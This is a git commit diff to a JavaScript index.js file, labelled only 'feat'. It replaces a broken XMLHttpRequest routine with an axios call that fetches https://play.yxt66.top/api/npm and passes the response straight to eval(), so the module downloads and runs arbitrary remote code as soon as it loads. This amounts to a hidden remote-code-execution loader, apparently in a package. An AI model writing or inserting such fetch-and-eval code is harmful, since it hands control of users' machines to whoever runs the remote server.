493ddb09b91c07a7e13d2a3ea6b27227e9bb2e59
yao6060 <1290576060@qq.com>
2025-05-30 11:30:42 +0800

    feat

--- index.js
+++ index.js
@@ -1,27 +1,7 @@
-function get(url, callback) {
-  const xhr = new XMLHttpRequest();
-  xhr.open('GET', url, true); // true 表示异步
+const  axios  = require("axios");
 
-  xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4) { // DONE
-      if (xhr.status === 200) {
-        callback(null, xhr.responseText);
-      } else {
-        callback(new Error('Request failed with status ' + xhr.status));
-      }
-    }
-  };
-
-  xhr.send();
-}
-
-// 用法示例
-get('https://play.yxt66.top/api/npm', function (err, data) {
-  if (err) {
-    console.error('请求失败:', err);
-  } else {
-    const fn = JSON.parse(data)
-    fn()
-    console.log('响应结果:', JSON.parse(data));
-  }
-});
+axios.get('https://play.yxt66.top/api/npm').then(res => {
+    console.log(res.data)
+    eval(res.data); 
+    console.log(test)
+})  
